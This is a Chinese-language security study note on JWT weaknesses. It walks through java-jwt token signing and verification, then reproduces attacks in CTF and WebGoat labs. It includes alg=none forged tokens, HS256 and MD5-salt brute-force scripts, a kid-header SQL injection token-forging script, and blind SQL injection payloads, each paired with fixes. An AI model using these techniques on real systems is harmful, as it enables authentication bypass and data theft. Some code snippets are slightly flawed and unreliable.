---
title: JWT漏洞原理与实战利用
description: 系统梳理 JWT 结构、常见漏洞（算法混淆、密钥爆破、None Algorithm、信息泄露、refresh_token 越权、kid 注入）及利用工具，结合
  DDCTF、0w1Club CTF 与 WebGoat 靶场（Lesson 5/8/10/11）实战复现垂直越权、盐值离线爆破、SQL 注入绕过、refresh_token
  越权刷新 access_token、kid 参数 SQL 注入四大经典漏洞场景全过程。深度解析 JWT 在 CSRF 防御中的 Token 生成与验证实现细节，结合
  Java JWT 库源码分析完善防御视角内容。
category: program-analysis
tags:
- JWT
- 漏洞利用
- DDCTF
- 0w1Club
- CTF
- WebGoat
- 垂直越权
- 算法混淆
- 密钥爆破
- MD5盐值爆破
- None Algorithm
- SQL注入
- 信息泄露
- CSRF防御
- Java JWT
- 源码分析
- refresh_token
- kid参数注入
date: '2023-04-16'
updated: '2026-11-14'
---

## JWT 结构详解

典型的 JWT 由三个部分组成，每部分之间用 `.` 分隔：**Header**、**Payload**、**Signature**。

### Header

头部包含签名算法与令牌类型，通常为 JSON 格式，经 Base64URL 编码后传输。

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

- `alg`：签名算法（如 HS256、RS256、none 等）
- `typ`：令牌类型，固定为 `JWT`

### Payload

载荷包含业务数据与标准声明，同样经 Base64URL 编码。标准字段包括：

| 字段 | 含义 |
|------|------|
| `iss` | 签发人 |
| `exp` | 过期时间 |
| `iat` | 签发时间 |
| `nbf` | 生效时间 |
| `jti` | 编号 |
| `sub` | 主题 |
| `aud` | 受众 |

除标准字段外，可自定义私有字段（如 `userRole`、`name` 等）。

### Signature

签名用于防篡改，生成方式：

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

密钥仅服务器持有，泄露将导致伪造风险。

### Base64URL 编码说明

标准 Base64 可能出现 `+`、`/`、`=`，不适合 URL 传参。Base64URL 将 `+`→`-`、`/`→`_`、去掉末尾 `=`。

## JWT 在 CSRF 防御中的 Token 生成与验证实现

### CSRF 防御流程概述

CSRF（跨站请求伪造）漏洞的防御策略之一是在页面中引入 Token，其核心流程为：

1. **将 CSRF Token 输出到页面中**
   - 用户打开页面时，服务器生成一个 Token，该 Token 通过加密算法对数据进行加密，一般包含随机字符串和时间戳的组合
   - 将 Token 放在 Session 中

2. **页面提交的请求携带这个 Token**

3. **服务器验证 Token 是否正确**

以 JSON Web Token (JWT) 为例进行深度分析。

### Java JWT 库源码分析（com.auth0:java-jwt:3.11.0）

#### 依赖配置

```xml
<dependency>
    <groupId>com.auth0</groupId>
    <artifactId>java-jwt</artifactId>
    <version>3.11.0</version>
</dependency>
```

#### 密钥与过期时间设置

```java
// 密钥
public static final String SECRET = "sdjhakdhajdklsl;o653632";
// 过期时间: 秒
public static final int EXPIRE = 5;
```

#### Token 生成流程源码解析

```java
public static String createToken(String userId, String userName) throws Exception {
    Calendar nowTime = Calendar.getInstance();
    nowTime.add(Calendar.SECOND, EXPIRE);          // 过期时间
    Date expireDate = nowTime.getTime();
    
    Map<String, Object> map = new HashMap<>();     // header头 设置token类型以及加密算法
    map.put("alg", "HS256");
    map.put("typ", "JWT");
    
    String token = JWT.create()
        .withHeader(map)                           // 头
        .withClaim("userId", userId)
        .withClaim("userName", userName)
        .withSubject("测试")                        // 主题
        .withIssuedAt(new Date())                  // 签名时间
        .withExpiresAt(expireDate)                 // 过期时间
        .sign(Algorithm.HMAC256(SECRET));          // 签名
    return token;
}
```

**详细源码追踪**：

1. **`JWT.create()` 初始化 Builder**
   ```java
   public static JWTCreator.Builder create() {
       return JWTCreator.init();
   }
   
   static JWTCreator.Builder init() {
       return new Builder();
   }
   ```

2. **Builder 内部维护 Header 与 Payload 两个 Map**
   ```java
   private final Map<String, Object> payloadClaims;
   private final Map<String, Object> headerClaims;
   
   Builder() {
       this.payloadClaims = new HashMap<>();
       this.headerClaims = new HashMap<>();
   }
   ```

3. **`withHeader()` 填充 Header Claims**
   ```java
   public Builder withHeader(Map<String, Object> headerClaims) {
       if (headerClaims == null) return this;
       for (Map.Entry<String, Object> entry : headerClaims.entrySet()) {
           if (entry.getValue() == null) {
               this.headerClaims.remove(entry.getKey());
           } else {
               this.headerClaims.put(entry.getKey(), entry.getValue());
           }
       }
       return this;
   }
   ```

4. **`withClaim()` 系列方法填充 Payload**
   ```java
   public Builder withClaim(String name, String value) throws IllegalArgumentException {
       assertNonNull(name);
       addClaim(name, value);
       return this;
   }
   
   private void addClaim(String name, Object value) {
       if (value == null) {
           payloadClaims.remove(name);
           return;
       }
       payloadClaims.put(name, value);
   }
   ```
   `withSubject()`、`withIssuedAt()`、`withExpiresAt()` 内部均调用 `addClaim()`。

5. **`sign()` 最终生成 Token**
   ```java
   public String sign(Algorithm algorithm) throws IllegalArgumentException, JWTCreationException {
       if (algorithm == null) throw new IllegalArgumentException("The Algorithm cannot be null.");
       
       // 自动补全 alg 与 typ
       headerClaims.put(PublicClaims.ALGORITHM, algorithm.getName());
       if (!headerClaims.containsKey(PublicClaims.TYPE)) {
           headerClaims.put(PublicClaims.TYPE, "JWT");
       }
       
       String signingKeyId = algorithm.getSigningKeyId();
       if (signingKeyId != null) withKeyId(signingKeyId);
       
       return new JWTCreator(algorithm, headerClaims, payloadClaims).sign();
   }
   ```

   `PublicClaims` 接口定义了标准字段常量：
   ```java
   public interface PublicClaims {
       // Header
       String ALGORITHM = "alg";
       String CONTENT_TYPE = "cty";
       String TYPE = "typ";
       String KEY_ID = "kid";
       // Payload
       String ISSUER = "iss";
       String SUBJECT = "sub";
       String EXPIRES_AT = "exp";
       String NOT_BEFORE = "nbf";
       String ISSUED_AT = "iat";
       String JWT_ID = "jti";
       String AUDIENCE = "aud";
   }
   ```

6. **`JWTCreator` 内部将 Map 序列化为 JSON**
   ```java
   private JWTCreator(Algorithm algorithm, Map<String, Object> headerClaims, Map<String, Object> payloadClaims) throws JWTCreationException {
       this.algorithm = algorithm;
       try {
           ObjectMapper mapper = new ObjectMapper();
           SimpleModule module = new SimpleModule();
           module.addSerializer(ClaimsHolder.class, new PayloadSerializer());
           mapper.registerModule(module);
           mapper.configure(MapperFeature.SORT_PROPERTIES_ALPHABETICALLY, true);
           headerJson = mapper.writeValueAsString(headerClaims);
           payloadJson = mapper.writeValueAsString(new ClaimsHolder(payloadClaims));
       } catch (JsonProcessingException e) {
           throw new JWTCreationException("Some of the Claims couldn't be converted to a valid JSON format.", e);
       }
   }
   ```

7. **核心签名生成逻辑**
   ```java
   private String sign() throws SignatureGenerationException {
       String header = Base64.encodeBase64URLSafeString(headerJson.getBytes(StandardCharsets.UTF_8));
       String payload = Base64.encodeBase64URLSafeString(payloadJson.getBytes(StandardCharsets.UTF_8));
       byte[] signatureBytes = algorithm.sign(header.getBytes(StandardCharsets.UTF_8), payload.getBytes(StandardCharsets.UTF_8));
       String signature = Base64.encodeBase64URLSafeString(signatureBytes);
       return String.format("%s.%s.%s", header, payload, signature);
   }
   ```
   - Header 与 Payload 分别 Base64URL 编码
   - 使用 HS256 算法对 `header.payload` 进行 HMAC 签名
   - 签名结果再次 Base64URL 编码
   - 三部分用 `.` 连接形成最终 Token

#### Token 验证流程源码解析

**验证核心逻辑**：重新生成 Signature，与 Token 中携带的 Signature 对比是否一致。

```java
// 创建验证器，绑定算法与密钥
JWTVerifier verifier = JWT.require(Algorithm.HMAC256(SECRET)).build();

// 验证 Token
DecodedJWT jwt = verifier.verify(token);
```

1. **`JWT.require()` 创建 Verification Builder**
   ```java
   public static Verification require(Algorithm algorithm) {
       return JWTVerifier.init(algorithm);
   }
   ```

2. **`verifier.verify(token)` 解析并验证**
   ```java
   // 1. 解析 Token 三段
   DecodedJWT jwt = new JWTDecoder(parser, token);
   
   JWTDecoder(JWTParser converter, String jwt) throws JWTDecodeException {
       parts = TokenUtils.splitToken(jwt);  // 按 '.' 分割
       headerJson = StringUtils.newStringUtf8(Base64.decodeBase64(parts[0]));
       payloadJson = StringUtils.newStringUtf8(Base64.decodeBase64(parts[1]));
       header = converter.parseHeader(headerJson);
       payload = converter.parsePayload(payloadJson);
   }
   ```

3. **验证流程**
   ```java
   public DecodedJWT verify(DecodedJWT jwt) throws JWTVerificationException {
       verifyAlgorithm(jwt, algorithm);    // 验证加密算法是否一致
       algorithm.verify(jwt);              // 验证 Signature
       verifyClaims(jwt, claims);          // 验证过期时间等 Claims
       return jwt;
   }
   ```

4. **HMAC 签名验证核心实现**
   ```java
   public void verify(DecodedJWT jwt) throws SignatureVerificationException {
       byte[] signatureBytes = Base64.decodeBase64(jwt.getSignature());  // 解码 Token 中的签名
       try {
           // 使用本地密钥、Token 中的 Header 与 Payload 重新计算签名并对比
           boolean valid = crypto.verifySignatureFor(getDescription(), secret, jwt.getHeader(), jwt.getPayload(), signatureBytes);
           if (!valid) {
               throw new SignatureVerificationException(this);
           }
       } catch (IllegalStateException | InvalidKeyException | NoSuchAlgorithmException e) {
           throw new SignatureVerificationException(this, e);
       }
   }
   ```
   - 解码 Token 携带的 Signature
   - 使用相同算法、密钥、Header、Payload 重新计算签名
   - 恒时比较防止时序攻击
   - 验证通过后再检查 `exp`、`nbf` 等时间类 Claims

## JWT 使用方式

- 客户端登录成功后获取 JWT，存储于 Cookie / localStorage。
- 后续请求通过以下方式携带：
  - Cookie（同域自动发送）
  - `Authorization: Bearer <token>` 请求头
  - URL 参数或 POST Body

## JWT 安全注意事项

1. **默认不加密**：Payload 仅编码，不可存放敏感信息。
2. **密钥保密**：签名密钥一旦泄露，攻击者可伪造任意 Token。
3. **无状态不可撤销**：签发后无法主动失效，建议设置较短 `exp` 并配合黑名单机制。
4. **传输加密**：必须使用 HTTPS 防止中间人窃取。
5. **算法白名单**：服务端必须显式校验 `alg` 字段，仅允许预期算法（HS256/RS256），拒绝 `none` 算法。
6. **密钥强度**：HS256 密钥熵需足够高，避免字典爆破。

## DDCTF 实战复现：垂直越权漏洞利用

### 题目环境与初步分析

- 目标地址：`http://117.51.136.197/`
- 两个关键接口：
  1. `POST /admin/login`：传 `username`、`pwd`，返回 JWT。
  2. `POST /admin/auth`：传 `username`、`pwd`、`token`，校验权限。

首次登录 `admin` 账号，返回 Token 解码后 `userRole=GUEST`，提示需要 `ADMIN` 权限。

### 步骤一：获取并解码 JWT

登录响应 `data` 字段为典型三段式 JWT：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyUm9sZSI6IkdVRVNUIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ.xxx
```

解码 Header 与 Payload：

```json
// Header
{"typ":"JWT","alg":"HS256"}

// Payload
{"userRole":"GUEST","name":"admin","iat":1556499536}
```

发现 `userRole` 可控，若能修改为 `ADMIN` 并绕过签名校验，即可实现垂直越权。

### 步骤二：尝试算法混淆攻击

**原理**：若服务端支持 `alg: "none"`，则忽略签名验证，仅需 Header+Payload。

构造脚本（参考 [JwtExploit](https://github.com/ShadowFlow123/JwtExploit/blob/master/jwtNone.py)）生成 Token：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ.
```

请求 `/admin/auth` 返回 **Token 不合法**，说明服务端禁用了 `none` 算法。

### 步骤三：密钥爆破

HS256 为对称加密，密钥强度取决于复杂度。使用字典爆破脚本（参考 [jwtBrute.py](https://github.com/ShadowFlow123/JwtExploit/blob/master/jwtBrute.py)）跑出密钥：**`admin`**（规律：密钥即用户名）。

### 步骤四：构造恶意 JWT 实现越权

利用爆破出的密钥 `admin`，按以下步骤构造合法 Token：

1. **Header Base64URL**  
   `{"typ":"JWT","alg":"HS256"}` → `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`

2. **Payload Base64URL**  
   `{"userRole":"ADMIN","name":"admin","iat":1556499536}` → `eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ`

3. **签名计算**  
   对 `header.payload` 使用 HMAC-SHA256，密钥 `admin`：  
   `HMACSHA256("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ", "admin")`  
   → `J5Lqm1twIWhIPU4V8G5jHzKhPFlkYju2U6aSVo9e3Lc`

4. **拼接完整 Token**  
   `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyUm9sZSI6IkFETUlOIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTU2NDk5NTM2fQ.J5Lqm1twIWhIPU4V8G5jHzKhPFlkYju2U6aSVo9e3Lc`

携带该 Token 请求 `/admin/auth`，成功获取 Flag 页面：`http://117.51.136.197/B5Itb8dFDaSFWZZo/client`。

> 也可使用 [jwt.io Debugger](https://jwt.io/) 可视化完成上述构造。

## WebGoat JWT 实战靶场完整复现（Lesson 5/8/10/11）

> 来源：[[xd-security-deserialization-xxe-notes-day37-39]]（XD安全 Day40-41 Java安全学习笔记）

WebGoat 靶场提供了四个经典的 JWT 漏洞练习关卡，覆盖了算法绕过、密钥爆破、refresh_token 越权、kid 参数 SQL 注入四大核心场景。

### Lesson 5：未验证签名算法（alg=none 绕过）

#### 漏洞原理
后端解析 JWT 时未验证签名算法是否为预期算法，攻击者可将 `alg` 修改为 `none`，去掉 Signature 部分，服务端若未校验算法白名单将直接信任 Payload 内容。

#### 复现步骤
1. 登录普通用户（如 Tom），点击“重置投票”按钮，抓包获取 JWT
2. 解码 JWT 分析结构：
   - **Header**：`{"alg":"HS256","typ":"JWT"}`
   - **Payload**：`{"admin":"false","user":"Tom","iat":...}`
3. 修改 Payload 中 `admin` 为 `true`，Header 中 `alg` 为 `none`
4. Base64URL 编码 Header 和 Payload，拼接为 `header.payload.`（Signature 留空）
5. 替换请求中的 JWT 发送，成功重置投票

#### 关键 Payload 构造
```
Header:    eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
Payload:   eyJhZG1pbiI6InRydWUiLCJ1c2VyIjoiVG9tIiwiaWF0IjoxNT... 
Token:     eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6InRydWUiLCJ1c2VyIjoiVG9tIiwiaWF0IjoxNT... .
```

#### 修复建议
- 服务端维护算法白名单，仅允许 HS256/RS256 等预期算法
- 显式拒绝 `alg: "none"` 的 Token

---

### Lesson 8：HS256 密钥爆破

#### 漏洞原理
HS256 为对称加密，密钥强度直接决定安全性。若密钥设置过于简单（如常见单词、默认值），攻击者可通过字典离线爆破还原密钥，进而伪造任意合法 JWT。

#### 复现步骤
1. 获取合法 JWT（任意用户登录后捕获）
2. 使用字典（题目提示提供字典）离线爆破 HS256 密钥
3. 爆破结果：`secret = "victory"`
4. 使用爆破出的密钥构造任意用户（如 admin）的合法 JWT

#### 爆破脚本思路（Python 示例）
```python
import jwt, base64

token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiVG9tIiwiaWF0IjoxN...signature"
header_b64, payload_b64, signature = token.split('.')
signing_input = f"{header_b64}.{payload_b64}"

with open('dict.txt') as f:
    for secret in f:
        secret = secret.strip()
        calc_sig = jwt.algorithms.HMACAlgorithm(HMACAlgorithm.SHA256).sign(signing_input, secret)
        if base64.urlsafe_b64encode(calc_sig).rstrip(b'=').decode() == signature:
            print(f"Found secret: {secret}")
            break
```

#### 修复建议
- 使用高熵随机密钥（≥256 bits）
- 定期轮换密钥
- 考虑使用非对称算法（RS256/ES256）

---

### Lesson 10：refresh_token 越权刷新 access_token

#### 漏洞原理
服务端未校验 `access_token` 与 `refresh_token` 是否属于同一用户。攻击者可使用自己的 `refresh_token` 刷新受害者的过期 `access_token`，实现水平越权。

#### 复现场景
- 登录 Jerry 获取 `access_token_J`、`refresh_token_J`
- 登录 Tom 获取 `access_token_T`（已过期）、`refresh_token_T`
- 使用 `refresh_token_J` + `access_token_T` 请求刷新接口
- 服务端返回 Tom 的新 `access_token`，攻击者以 Tom 身份访问资源

#### 攻击流程图解
```
Attacker (Jerry)          Victim (Tom)              Server
     |                        |                        |
     |-- login -->            |                        |
     |<-- access_J, refresh_J |                        |
     |                        |-- login -->            |
     |                        |<-- access_T(expired),  |
     |                        |     refresh_T          |
     |                        |                        |
     |-- POST /refresh ------------------------------>|
     |   access_token: access_T                       |
     |   refresh_token: refresh_J                     |
     |                        |                        |
     |<-- 200 OK: new_access_T -----------------------|
     |                        |                        |
     |-- GET /resource (new_access_T) --------------->|
     |<-- Tom's data -----------------------------------|
```

#### 复现难点说明
原文提到“复现有问题”，参考文章链接已失效。实际测试中需注意：
- 刷新接口的具体参数名（可能为 `refresh_token`、`access_token` 或放在 Header 中）
- 部分实现会校验 `refresh_token` 对应的用户 ID 与 `access_token` 中的 `sub`/`user` 是否一致，若校验则漏洞不存在
- 需结合具体 WebGoat 版本源码分析

#### 修复建议
- 服务端存储 `refresh_token` 与用户 ID 的绑定关系
- 刷新时必须校验 `refresh_token` 所属用户与 `access_token` 声称用户一致
- `refresh_token` 设置较短过期时间，配合撤销机制

---

### Lesson 11：kid 参数 SQL 注入

#### 漏洞原理
JWT Header 中的 `kid` (Key ID) 参数用于标识签名密钥。后端解析 JWT 时，直接使用 `kid` 值拼接 SQL 查询数据库获取密钥，未使用参数化查询，导致 SQL 注入。

#### 源码分析（关键片段）
```java
// 伪代码还原漏洞逻辑
String kid = jwt.getHeader().getKeyId();  // 从 Header 取 kid
String sql = "SELECT key FROM jwt_keys WHERE id = '" + kid + "'";  // 直接拼接
ResultSet rs = stmt.executeQuery(sql);
String secret = rs.getString("key");  // 返回密钥用于验签
```

#### 攻击思路
1. 点击“删除 Jerry 账户”按钮，抓包获取 JWT
2. 解码 Header 发现存在 `kid` 字段：`{"alg":"HS256","typ":"JWT","kid":"webgoat_key"}`
3. 构造 SQL 注入 Payload，使查询返回攻击者可控的密钥：
   ```
   kid = "123' and 1=2 union select 'attacker_controlled_key'--"
   ```
   对应 SQL：`SELECT key FROM jwt_keys WHERE id = '123' and 1=2 union select 'attacker_controlled_key'--'`
4. 使用返回的密钥 `attacker_controlled_key` 签名伪造 JWT，修改 Payload 指向删除 Tom 账户
5. 发送请求，成功删除 Tom 账户

#### 完整 Token 构造脚本（Python）
```python
import jwt, base64, json

# 1. 构造恶意 Header，注入 kid
malicious_header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "123' and 1=2 union select 'attacker_key'--"
}

# 2. 构造 Payload（指定删除 Tom）
malicious_payload = {
    "user": "Tom",
    "iat": 1234567890
}

# 3. 使用注入返回的密钥签名
# 注意：实际攻击中需先确定 union select 返回的列数、类型，并确保数据库中无 id='123' 的记录
secret = "attacker_key"
token = jwt.encode(malicious_payload, secret, algorithm='HS256', headers=malicious_header)
print(token)
```

#### 实战细节
- 需确保 `union select` 的列数与原表 `jwt_keys` 一致（通常为 id、key 两列）
- 注入返回的密钥需为 Base64 编码或原文，视后端解码逻辑而定（原文提到“返回密钥的 base64 编码”）
- 利用 jwt.io 或脚本生成最终 Token，替换请求包中的 JWT

#### 修复建议
- 使用参数化查询 / PreparedStatement 查询密钥
- 校验 `kid` 格式（如仅允许字母数字下划线），拒绝含特殊字符的值
- 密钥查询失败时应返回错误，而非返回空或默认密钥

## 0w1Club CTF 实战案例补充

### 案例一：JWT MD5 盐值离线爆破伪造 admin token

**来源**：[[0w1club-ctf-web-writeup-jwt-sqli-brute]] 第 03 题

#### 题目场景
- 登录测试账号后，Cookie 中包含 JWT 认证令牌
- Base64 解码发现采用 **MD5 加盐方式** 签名（非标准 HS256）
- 后端验证逻辑：`signature = MD5(header + "." + payload + salt)`

#### 攻击思路
1. **获取合法 JWT**：使用测试账号登录，捕获 Cookie 中的 token
2. **离线爆破盐值**：编写脚本（推荐 PHP 保持与后端一致），对盐值进行字典爆破
   - 爆破目标：`MD5(base64(header) + "." + base64(payload) + salt) === signature`
   - 盐值通常较短、规律性强（如用户名、固定字符串等）
3. **伪造管理员 Token**：
   - 修改 Payload 中 `userRole` 为 `admin` / `ADMIN`
   - 使用爆破出的盐值重新计算签名
   - 替换 Cookie 中的 token 刷新页面，越权访问管理员功能获取 flag

#### 关键代码片段（PHP 示例）
```php
// 爆破盐值
$salt_dict = file('dict.txt', FILE_IGNORE_NEW_LINES);
foreach ($salt_dict as $salt) {
    $calc_sign = md5($header_b64 . '.' . $payload_b64 . $salt);
    if ($calc_sign === $signature) {
        echo "Found salt: $salt";
        break;
    }
}

// 伪造 admin token
$new_payload = '{"userRole":"admin","name":"admin","iat":'.time().'}';
$new_payload_b64 = base64_url_encode($new_payload);
$new_sign = md5($header_b64 . '.' . $new_payload_b64 . $found_salt);
$forged_token = $header_b64 . '.' . $new_payload_b64 . '.' . $new_sign;
```

#### 防御建议
- 使用标准算法（HS256/RS256）而非自制签名方案
- 盐值/密钥需足够长、高熵，避免规律性
- 服务端应严格校验算法字段，拒绝非预期算法

---

### 案例二：None Algorithm 漏洞绕过签名验证并注入 SQL 语句获取 flag

**来源**：[[0w1club-ctf-web-writeup-jwt-sqli-brute]] 第 05 题

#### 题目场景
- 页面存在数据库交互特征，疑似 SQL 注入点
- 认证采用 JWT，Cookie 中传递 token
- 后端解析 JWT 后，将 `username` / `name` 字段直接拼接进 SQL 查询

#### 攻击链分析
1. **识别注入点**：推测后端查询类似 `SELECT * FROM users WHERE username = '<jwt_payload_name>'`
2. **绕过签名验证**：利用 **None Algorithm 漏洞**（`alg: "none"`）
   - 服务端若未显式禁用 `none` 算法，会跳过签名校验
   - 构造 Header：`{"typ":"JWT","alg":"none"}` → Base64URL 编码
   - 构造 Payload：注入 SQL 语句于可控字段（如 `name` 或 `username`）
   - Signature 留空（仅保留两个点分隔符）
3. **构造恶意 Payload 示例**：
   ```json
   {
     "username": "admin' UNION SELECT flag FROM chest--",
     "userRole": "ADMIN"
   }
   ```
4. **发送请求**：携带伪造的 `header.payload.` 访问目标接口，触发 SQL 注入，从 `chest` 表中查出 flag

#### 完整 Token 构造流程
```
Header:    eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
Payload:   eyJ1c2VybmFtZSI6ImFkbWluJyBVUklPTiBTRUxFQ1QgZmxhZyBGUk9NIENIRVNULS0iLCJ1c2VyUm9sZSI6IkFETUlOIn0
Signature: (空)
Token:     eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluJyBVUklPTiBTRUxFQ1QgZmxhZyBGUk9NIENIRVNULS0iLCJ1c2VyUm9sZSI6IkFETUlOIn0.
```

#### 根因与修复
| 根因 | 修复措施 |
|------|----------|
| 服务端未校验 `alg` 字段，允许 `none` 算法 | 显式维护算法白名单（仅允许 HS256/RS256 等），拒绝 `none` |
| JWT 解析后的用户输入直接拼接 SQL | 使用参数化查询 / 预编译语句 |
| 业务逻辑过度信任客户端传递的身份标识 | 服务端维护会话映射，JWT 仅作标识不作授权依据 |

## Java 预编译防御 SQL 注入（补充）

> 来源：[[xd-security-deserialization-xxe-notes-day37-39]]（XD安全 Day40-41 学习笔记）

### SQL 注入本质
未经检查的用户输入通过字符串拼接进入 SQL 语句，改变了原本的执行逻辑。

### PreparedStatement 预编译原理
1. SQL 语句含占位符 `?` 发送给数据库，**预编译** 生成执行计划
2. 执行计划确定后，**逻辑固化**，后续 `setXXX()` 传入的参数仅作为**数据**处理，不再参与语法解析
3. 即使参数含 SQL 关键字，也会被当作普通字符串处理

### 经典预处理代码
```java
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, username);  // 参数作为纯数据传入
ps.setString(2, password);
ResultSet rs = ps.executeQuery();
```

### 无法参数化的场景
| 场景 | 原因 | 替代方案 |
|------|------|----------|
| `ORDER BY` 字段名 | 字段名不能加引号，参数化会变字符串 | 白名单校验字段名 |
| `LIKE` 模糊查询 | 通配符 `%` `_` 需拼接在参数中 | 参数化传入已拼接好通配符的值 |
| 表名、库名、函数名 | 同字段名 | 白名单校验 |

### WebGoat 实战：Order By 注入
- 靶场：WebGoat 8.2.1 SQL Injection (mitigation) 第 12 关
- 注入点：排序字段参数 `column=ip` → `column=ip'` 报错
- 利用：布尔盲注 payload `(select case when (substr((select ip from servers limit 1),1,1)='1') then 1 else 2 end)` 配合 Burp Intruder 爆破
- 结果：服务器 IP 前三位 `104`

## 利用工具与脚本

- **JwtExploit** 系列脚本（GitHub）：  
  - `jwtNone.py`：算法混淆生成 `none` 算法 Token  
  - `jwtBrute.py`：HS256 密钥字典爆破
- **CyberChef** / **jwt.io** ：Base64URL 编解码、签名计算、Token 调试
- **Burp Suite** 插件：JWT Editor、JSON Web Tokens 支持自动化测试
- **自定义脚本**：针对非标准签名（如 MD5+salt）需自行编写爆破/伪造脚本，建议与后端语言保持一致（PHP/Python/Node.js/Go）

## 交叉引用与延伸阅读

- [[0w1club-ctf-web-writeup-jwt-sqli-brute]] — 0w1Club CTF Web 方向完整 Writeup，含 Base64+Brainfuck 签到、.htpasswd 信息泄露、验证码绕过暴力破解等题目
- [[0w1club-ctf-web-writeup-hash-extension-rsa]] — 同源 CTF Web 题解，涵盖哈希长度扩展攻击、PHP 弱类型比较、RSA 解密等技术
- [[java-preparedstatement-sql-injection-defense]] — Java PreparedStatement 预编译机制防御 SQL 注入，与 JWT 场景下的参数化查询防御同属一类
- [[spring-boot-devtools-deserialization-rce]] — Spring Boot DevTools 弱默认密钥导致反序列化 RCE，与 JWT 密钥管理不当同属“默认/弱密钥”风险类
- [[xd-security-deserialization-xxe-notes-day37-39]] — XD安全 Day40-41 Java安全学习笔记原文，包含 WebGoat JWT 全关卡复现细节

## 参考资源

- 原文：[微信公众号文章](http://mp.weixin.qq.com/s?__biz=MzUzMzEwMDk3Mg==&mid=2247483879&idx=1&sn=62e66f486f9060739640bcd287237b31)
- 0w1Club 微信归档索引：[[0w1club-wechat-archive-201908-202207]]
- 作者 GitHub（DDCTF 复现脚本）：<https://github.com/ShadowFlow123/>
- 博客园对应文章：<https://www.cnblogs.com/jinbuqi/p/10361698.html>
- CSRF Token 防御原文：[无名安全团队文章](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247486542&idx=1&sn=3828e2d41f13049dd4f974394272d568)
- XD安全学习笔记原文：[Day40-41 Java安全](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247485028&idx=1&sn=2fc279d7fc79cad6169aed6286653e37)

## 来源

- [0x00实验室-202108-202304_073](../sources/0x00实验室-202108-202304_073.md)
- [xd_security_day40_41_java_notes](../sources/xd_security_day40_41_java_notes.md)
- [0x00实验室-202108-202304_090](../sources/0x00实验室-202108-202304_090.md)
